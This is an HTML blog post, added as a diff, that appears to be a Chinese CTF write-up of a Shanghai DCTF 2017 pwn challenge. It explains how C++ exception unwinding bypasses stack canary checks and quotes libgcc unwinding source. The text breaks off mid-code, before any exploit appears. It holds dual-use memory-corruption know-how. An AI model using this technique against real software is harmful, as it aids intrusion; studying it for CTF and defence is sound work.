@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="这个题在现场的时候没有一个队伍做出来，我想估计都是被后面的洞给坑了吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shanghai-DCTF-2017 线下攻防Pwn题">
+<meta property="og:url" content="https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="这个题在现场的时候没有一个队伍做出来，我想估计都是被后面的洞给坑了吧">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-02.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-03.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-04.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-05.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-06.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-07.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-09.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-10.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-11.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-12.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-13.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-14.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-16.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dcif-final-15.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-18.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-19.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-20.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-21.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-22.jpg">
+<meta property="article:published_time" content="2017-11-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:28:17.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="DCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-01.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Shanghai-DCTF-2017 线下攻防Pwn题</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017-SECCON-OnlineCTF.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/CVE-2017-11882-analyze.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&text=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&is_video=false&description=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shanghai-DCTF-2017 线下攻防Pwn题&body=Check out this article: https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&title=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&name=Shanghai-DCTF-2017 线下攻防Pwn题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-Shanghai-DCTF-final-pwn.html&t=Shanghai-DCTF-2017 线下攻防Pwn题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E5%9C%BA%E5%85%A5%E5%9D%91"><span class="toc-number">1.1.</span> <span class="toc-text">现场入坑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E6%9C%BA"><span class="toc-number">1.2.</span> <span class="toc-text">转机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">C++异常机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E8%BF%94%E5%9B%9E"><span class="toc-number">2.1.</span> <span class="toc-text">C++ 函数的调用和返回</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E6%8A%9B%E5%87%BA"><span class="toc-number">2.2.</span> <span class="toc-text">异常抛出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E6%8D%95%E8%8E%B7%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">异常捕获机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%9B%9E%E9%80%80%EF%BC%88Stack-Unwind%EF%BC%89%E6%9C%BA%E5%88%B6"><span class="toc-number">2.4.</span> <span class="toc-text">栈回退（Stack Unwind）机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%8B%E8%BF%87%E7%A8%8B"><span class="toc-number">2.5.</span> <span class="toc-text">总结下过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unwind%E7%9A%84%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.6.</span> <span class="toc-text">unwind的做了什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEstack-pivot"><span class="toc-number">3.1.</span> <span class="toc-text">寻找stack_pivot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">4.</span> <span class="toc-text">完整exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Shanghai-DCTF-2017 线下攻防Pwn题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-11-30T16:00:00.000Z" itemprop="datePublished">2017-12-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/DCTF/" rel="tag">DCTF</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Shanghai-DCTF-2017 线下攻防Pwn题  –利用c++异常机制绕过canary检查，文章首发于360安全客【<a href="https://www.anquanke.com/post/id/89855%E3%80%91">https://www.anquanke.com/post/id/89855】</a></p>
+<p>题目和完整的exp可以从这里获取<a href="https://pan.baidu.com/s/1nuNQC9z">链接</a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="现场入坑"><a href="#现场入坑" class="headerlink" title="现场入坑"></a>现场入坑</h3><p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-01.jpg"></p>
+<p>菜单栏中一共有五个选项，其中最容易引起我们注意的就是选项4，<strong>test security</strong>，在这个函数里有三个漏洞</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-02.jpg"></p>
+<p>分别是格式化字符串漏洞 、栈溢出、堆溢出，<br>1.格式化字符串漏洞</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-03.jpg"></p>
+<p>格式化串不可控<br>2.栈溢出</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-04.jpg"></p>
+<p>结构化写入，但是题目开启了canary 没法绕过</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-05.jpg"></p>
+<p>3.堆溢出<br>仅仅一次溢出无返回，我没想到方法</p>
+<p>但是由于上述原因三个没法完整利用起来，如果阅读到这篇文章到你，有利用方法或者利用思路请邮件告知我。</p>
+<p>在决赛现场把时间都在耗在了这个函数里了，现在想想估计进了一个大坑吧。</p>
+<h3 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h3><p>比赛结束后，还是感觉心里堵堵的，心想，比赛也不单单是比赛吧，遇到了问题总不去解决总还有会遇到的，比赛结束后的几天，我拿到了题目的exp，于是开始了调试之旅。</p>
+<p>题目的关键在第一个函数里，<strong>start flexmdt</strong></p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-06.jpg"></p>
+<p>我们仔细看这个函数的流程，首先程序里进行了一个异常捕捉机制，在伪代码中，这个try结构并没有显示出来。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    sub_401148();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">int</span> *_ZTIi)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在**sub_401148()**这个函数里面<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-07.jpg"></p>
+<p>其实是能注意到一个整型溢出的漏洞<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg"></p>
+<p>对输入加一后进行无符号整型强制转换</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-08.jpg"><br>这样一来，我们发现这里就存在了一个栈溢出漏洞…读取的s1是在栈上的</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-09.jpg"></p>
+<p>但是又回到了一开始的问题，如何绕过canary?</p>
+<h2 id="C-异常机制"><a href="#C-异常机制" class="headerlink" title="C++异常机制"></a>C++异常机制</h2><p>于是，我们开始去研究**sub_400F8F()**函数周围存在的异常机制</p>
+<h3 id="C-函数的调用和返回"><a href="#C-函数的调用和返回" class="headerlink" title="C++ 函数的调用和返回"></a>C++ 函数的调用和返回</h3><p>首先异常机制中最重要的三个关键字就是：throw   try   catch，Throw抛出异常，try 包含异常模块，catch 捕捉抛出的异常，三者各有各的分工，集成在一起就构成了异常的基本机制</p>
+<p>首先澄清一点，这里说的 “C++ 函数”是指：<br>1.该函数可能会直接或间接地抛出一个异常：即该函数的定义存放在一个 C++ 编译（而不是传统 C）单元内，并且该函数没有使用“throw()”异常过滤器。<br>2.该函数的定义内使用了 try 块。<br>只需要满足一点即可，</p>
+<h3 id="异常抛出"><a href="#异常抛出" class="headerlink" title="异常抛出"></a>异常抛出</h3><p>在编译一段 C++ 代码时，编译器会将所有 throw 语句替换为其 C++ 运行时库中的某一指定函数，这里我们叫它 __CxxRTThrowExp（与本文提到的所有其它数据结构和属性名一样，在实际应用中它可以是任意名称）。该函数接收一个编译器认可的内部结构（我们叫它 EXCEPTION 结构）。这个结构中包含了待抛出异常对象的起始地址、用于销毁它的析构函数，以及它的 type_info 信息。对于没有启用 RTTI 机制（编译器禁用了 RTTI 机制或没有在类层次结构中使用虚表）的异常类层次结构，可能还要包含其所有基类的 type_info 信息，以便与相应的 catch 块进行匹配。</p>
+<p>__CxxRTThrowExp 首先接收（并保存）EXCEPTION 对象；然后从 TLS：Current ExpHdl 处找到与当前函数对应的 piHandler、nStep 等异常处理相关数据；并按照前文所述的机制完成异常捕获和栈回退。由此完成了包括“抛出”-&gt;“捕获”-&gt;“回退”等步骤的整套异常处理机制。</p>
+<h3 id="异常捕获机制"><a href="#异常捕获机制" class="headerlink" title="异常捕获机制"></a>异常捕获机制</h3><p>一个异常被抛出时，就会立即引发 C++ 的异常捕获机制：<br>根据 c++ 的标准，异常抛出后如果在当前函数内没有被捕捉(catch)，它就要沿着函数的调用链继续往上抛，直到走完整个调用链，或者在某个函数中找到相应的 catch。如果走完调用链都没有找到相应的 catch，那么std::terminate() 就会被调用，这个函数默认是把程序 abort，而如果最后找到了相应的 catch，就会进入该 catch 代码块，执行相应的操作。</p>
+<p>程序中的 catch 那部分代码有一个专门的名字叫作：Landing pad（不十分准确），从抛异常开始到执行 landing pad 里的代码这中间的整个过程叫作 stack unwind，这个过程包含了两个阶段：<br>1）从抛异常的函数开始，对调用链上的函数逐个往前查找 landing pad。</p>
+<p>2）如果没有找到 landing pad 则把程序 abort，否则，则记下 landing pad 的位置，再重新回到抛异常的函数那里开始，一帧一帧地清理调用链上各个函数内部的局部变量，直到 landing pad 所在的函数为止。</p>
+<p>为了能够成功地捕获异常和正确地完成栈回退（stack unwind）</p>
+<h3 id="栈回退（Stack-Unwind）机制"><a href="#栈回退（Stack-Unwind）机制" class="headerlink" title="栈回退（Stack Unwind）机制"></a>栈回退（Stack Unwind）机制</h3><p>“回退”是伴随异常处理机制引入 C++ 中的一个新概念，主要用来确保在异常被抛出、捕获并处理后，所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收。</p>
+<h3 id="总结下过程"><a href="#总结下过程" class="headerlink" title="总结下过程"></a>总结下过程</h3><p>在调试的程序的过程中，我们也发现，异常对象由函数 <strong>cxa_allocate_exception() 进行创建，最后由 __cxa_free_exception() 进行销毁。当我们在程序里执行了抛出异常后，编译器为我们做了如下的事情：<br>1）调用 __cxa_allocate_exception 函数，分配一个异常对象。</strong></p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-10.jpg"></p>
+<p>2）调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化__</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-11.jpg"></p>
+<p>3）__cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。</p>
+<p>4）_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</p>
+<p>5）如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</p>
+<p>6）_Unwind_RaiseException() 将控制权转到相应的catch代码。<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-12.jpg"></p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-13.jpg"></p>
+<ol start="7">
+<li>unwind 完成，用户代码继续执行。</li>
+</ol>
+<p>然后我们很惊讶的发现，程序跳过了canary检查的环节</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-finla-14.jpg"></p>
+<p>这很让我好奇…unwind的时候是不是发生了什么？</p>
+<h3 id="unwind的做了什么？"><a href="#unwind的做了什么？" class="headerlink" title="unwind的做了什么？"></a>unwind的做了什么？</h3><p>unwind 的过程是从 __cxa_throw() 里开始的，请看如下源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="keyword">void</span></span><br><span class="line">__cxxabiv1::__cxa_throw (<span class="keyword">void</span> *obj, <span class="built_in">std</span>::type_info *tinfo,</span><br><span class="line"><span class="keyword">void</span> (_GLIBCXX_CDTOR_CALLABI *dest) (<span class="keyword">void</span> *))</span><br><span class="line">&#123;</span><br><span class="line">   PROBE2 (<span class="keyword">throw</span>, obj, tinfo);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Definitely a primary.</span></span><br><span class="line">   __cxa_refcounted_exception *header = __get_refcounted_exception_header_from_obj (obj);</span><br><span class="line">   header-&gt;referenceCount = <span class="number">1</span>;</span><br><span class="line">   header-&gt;exc.exceptionType = tinfo;</span><br><span class="line">   header-&gt;exc.exceptionDestructor = dest;</span><br><span class="line">   header-&gt;exc.unexpectedHandler = <span class="built_in">std</span>::get_unexpected ();</span><br><span class="line">   header-&gt;exc.terminateHandler = <span class="built_in">std</span>::get_terminate ();</span><br><span class="line">   __GXX_INIT_PRIMARY_EXCEPTION_CLASS(header-&gt;exc.unwindHeader.exception_class);</span><br><span class="line">   header-&gt;exc.unwindHeader.exception_cleanup = __gxx_exception_cleanup;</span><br><span class="line"></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">ifdef</span> _GLIBCXX_SJLJ_EXCEPTIONS</span></span><br><span class="line">   _Unwind_SjLj_RaiseException (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">   _Unwind_RaiseException (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Some sort of unwinding error. Note that terminate is a handler.</span></span><br><span class="line">   __cxa_begin_catch (&amp;header-&gt;exc.unwindHeader);</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">terminate</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们可以看到 __cxa_throw 最终调用了 _Unwind_RaiseException()，stack unwind 就此开始，如前面所说，unwind 分为两个阶段，分别进行搜索 catch 及清理调用栈，其相应的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Raise an exception, passing along the given exception object.  */</span></span><br><span class="line"></span><br><span class="line">_Unwind_Reason_Code</span><br><span class="line">_Unwind_RaiseException(struct _Unwind_Exception *exc)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Context</span> <span class="title">this_context</span>, <span class="title">cur_context</span>;</span></span><br><span class="line">  _Unwind_Reason_Code code;</span><br><span class="line"></span><br><span class="line">  uw_init_context (&amp;this_context);</span><br><span class="line">  cur_context = this_context;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phase 1: Search.  Unwind the stack, calling the personality routine</span></span><br><span class="line"><span class="comment">     with the _UA_SEARCH_PHASE flag set.  Do not modify the stack yet.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _Unwind_FrameState fs;</span><br><span class="line"></span><br><span class="line">      code = uw_frame_state_for (&amp;cur_context, &amp;fs);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code == _URC_END_OF_STACK)</span><br><span class="line">    <span class="comment">/* Hit end of stack with no handler found.  */</span></span><br><span class="line">    <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">    <span class="comment">/* Some error encountered.  Ususally the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">       diagnose these and merely crashes.  */</span></span><br><span class="line">    <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fs.personality)</span><br><span class="line">    &#123;</span><br><span class="line">      code = (*fs.personality) (<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">                    exc, &amp;cur_context);</span><br><span class="line">      <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">        <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      uw_update_context (&amp;cur_context, &amp;fs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Indicate to _Unwind_Resume and associated subroutines that this</span></span><br><span class="line"><span class="comment">     is not a forced unwind.  Further, note where we found a handler.  */</span></span><br><span class="line">  exc-&gt;private_1 = <span class="number">0</span>;</span><br><span class="line">  exc-&gt;private_2 = uw_identify_context (&amp;cur_context);</span><br><span class="line"></span><br><span class="line">  cur_context = this_context;</span><br><span class="line">  code = _Unwind_RaiseException_Phase2 (exc, &amp;cur_context);</span><br><span class="line">  <span class="keyword">if</span> (code != _URC_INSTALL_CONTEXT)</span><br><span class="line">    <span class="keyword">return</span> code;</span><br><span class="line"></span><br><span class="line">  uw_install_context (&amp;this_context, 